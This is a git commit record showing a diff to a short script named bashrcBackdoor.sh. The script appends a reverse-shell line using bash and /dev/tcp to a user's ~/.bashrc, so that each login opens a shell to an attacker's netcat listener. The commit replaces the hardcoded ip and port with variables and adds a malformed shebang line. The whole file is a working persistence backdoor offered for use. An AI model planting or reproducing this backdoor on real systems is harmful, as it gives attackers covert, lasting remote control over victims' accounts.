c054637538ad26e998965414af879e9d02a9b658
7RU7H <100765038+7RU7H@users.noreply.github.com>
2022-03-03 09:32:24 +0000

    Update bashrcBackdoor.sh
    Added #!/bin/bash
    Added comment to set and replace

--- bashrcBackdoor.sh
+++ bashrcBackdoor.sh
@@ -1,2 +1,4 @@
+#/bin/bash
 #copy into a .bashrc, remember to have nc -lvnp port for when user logs in
-echo 'bash -i >& /dev/tcp/ip/port 0>&1' >> ~/.bashrc
+#set or replace 'ip' and 'port'
+echo 'bash -i >& /dev/tcp/$ip/$port 0>&1' >> ~/.bashrc
